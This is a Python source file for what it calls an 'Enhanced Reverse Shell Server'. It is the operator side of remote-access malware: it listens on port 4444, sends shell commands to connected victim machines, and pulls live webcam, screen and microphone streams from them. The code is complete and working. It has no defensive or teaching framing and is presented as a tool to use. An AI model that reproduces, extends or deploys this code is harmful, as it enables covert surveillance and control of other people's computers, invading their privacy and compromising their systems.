import socket
import threading
import os
import sys
import base64
import atexit
import subprocess
import importlib
from PIL import Image, ImageTk
import tkinter as tk

def install_and_import(package_name, import_name=None):
    import_name = import_name or package_name
    try:
        return importlib.import_module(import_name)
    except ImportError:
        print(f"[!] {package_name} not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return importlib.import_module(import_name)

np = install_and_import("numpy")
cv2 = install_and_import("opencv-python", "cv2")
sd = install_and_import("sounddevice")

# Readline for input history (optional)
try:
    import readline
except ImportError:
    try:
        import pyreadline as readline
    except ImportError:
        readline = None

if readline:
    histfile = os.path.expanduser("~/.rev_shell_history")
    if os.path.exists(histfile):
        readline.read_history_file(histfile)
    atexit.register(lambda: readline.write_history_file(histfile))

BANNER = r"""
╔════════════════════════════════════════════╗
║      ☣ Enhanced Reverse Shell Server ☣     ║
║             Made in Indian Ocean     ║
╚════════════════════════════════════════════╝
"""

clients = []
lock = threading.Lock()

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

def receive_output(client_socket, client_addr):
    buffer = b""
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            buffer += data


            while b"FRAME_START\n" in buffer and b"\nFRAME_END\n" in buffer:
                start = buffer.index(b"FRAME_START\n") + len(b"FRAME_START\n")
                end = buffer.index(b"\nFRAME_END\n")
                frame_data = buffer[start:end]
                buffer = buffer[end + len(b"\nFRAME_END\n"):]

                try:
                    img = base64.b64decode(frame_data)
                    nparr = np.frombuffer(img, np.uint8)
                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                    if frame is not None:
                        # Send frame to Tkinter window queue
                        show_frame_tkinter(client_addr, frame)
                    else:
                        print("[!] cv2.imdecode returned None (invalid image)")
                except Exception as e:
                    print("[!] Frame decode error:", e)

            # Process mic audio if present
            while b"MIC_START\n" in buffer and b"\nMIC_END\n" in buffer:
                start = buffer.index(b"MIC_START\n") + len(b"MIC_START\n")
                end = buffer.index(b"\nMIC_END\n")
                audio_data = buffer[start:end]
                buffer = buffer[end + len(b"\nMIC_END\n"):]

                try:
                    audio_array = np.frombuffer(audio_data, dtype=np.int16)
                    sd.play(audio_array, samplerate=44100)
                    sd.wait()
                except Exception as e:
                    print("[!] Audio playback error:", e)

            # Print any non-frame/non-mic text output
            if b"FRAME_START\n" not in buffer and b"MIC_START\n" not in buffer:
                lines = buffer.split(b"\n")
                for line in lines[:-1]:
                    try:
                        print(line.decode(errors='ignore'))
                    except:
                        pass
                buffer = lines[-1]
    except Exception:
        print(f"\n[!] Lost connection to {client_addr}")
    finally:
        client_socket.close()
        with lock:
            if (client_socket, client_addr) in clients:
                clients.remove((client_socket, client_addr))

# Tkinter UI globals and lock
root = None
windows = {}
windows_lock = threading.Lock()

def show_frame_tkinter(client_addr, frame):
    global root, windows, windows_lock

    # Resize frame for display
    frame = cv2.resize(frame, (640, 480), interpolation=cv2.INTER_AREA)

    # Convert BGR to RGB for PIL
    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    pil_img = Image.fromarray(rgb_frame)
    imgtk = ImageTk.PhotoImage(image=pil_img)

    def update_label():
        with windows_lock:
            if client_addr not in windows:
                # Create new window for this client
                win = tk.Toplevel(root)
                win.title(f"Live Stream - {client_addr[0]}")
                label = tk.Label(win)
                label.pack()
                windows[client_addr] = (win, label)
            else:
                win, label = windows[client_addr]
            label.imgtk = imgtk
            label.config(image=imgtk)
            win.update_idletasks()

    if root:
        root.after(0, update_label)

def handle_client(client_socket, client_addr):
    print(f"\n[+] Session opened with {client_addr[0]}:{client_addr[1]}")
    print("    ❈ Type 'exit' to close the session.")
    print("    ❈ Prefix commands with 'rs ' to send to remote shell.")
    print("    ❈ Local commands: livecam, livescreen, livemic, help\n")

    recv_thread = threading.Thread(target=receive_output, args=(client_socket, client_addr), daemon=True)
    recv_thread.start()

    try:
        while True:
            command = input(f"[{client_addr[0]}] $ ").strip()
            if not command:
                continue

            if command.lower() == "exit":
                client_socket.send(b"exit\n")
                break

            # Local commands
            if not command.startswith("rs "):
                cmd = command.lower()

                if cmd == "help":
                    print("Local commands:\n livecam - start remote webcam stream\n livescreen - start remote screen stream\n livemic - start remote microphone stream\n help - this message\n exit - close session")
                elif cmd == "livecam":
                    client_socket.send(b"livecam\n")  # Request camera stream from remote
                elif cmd == "livescreen":
                    client_socket.send(b"livescreen\n")  # Request screen stream from remote
                elif cmd == "livemic":
                    client_socket.send(b"livemic\n")  # Request mic stream from remote
                else:
                    print(f"[!] Unknown local command: {command}")
                continue

            # Remote shell commands (strip 'rs ' prefix)
            remote_cmd = command[3:].strip()
            if remote_cmd:
                client_socket.send(remote_cmd.encode() + b'\n')

    except (KeyboardInterrupt, EOFError):
        print(f"\n[!] Closing session with {client_addr}")
    finally:
        client_socket.close()
        with lock:
            if (client_socket, client_addr) in clients:
                clients.remove((client_socket, client_addr))

def accept_connections(server_socket):
    while True:
        try:
            client_socket, addr = server_socket.accept()
            with lock:
                clients.append((client_socket, addr))
            threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("\n[!] Shutting down server...")
            break

def main():
    global root
    print_banner()
    bind_ip = "0.0.0.0"
    bind_port = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print(f"[+] Listening on {bind_ip}:{bind_port}...\n")

    # Tkinter main window (hidden)
    root = tk.Tk()
    root.withdraw()  # hide root window

    accept_thread = threading.Thread(target=accept_connections, args=(server,), daemon=True)
    accept_thread.start()

    root.mainloop()

if __name__ == "__main__":
    main()
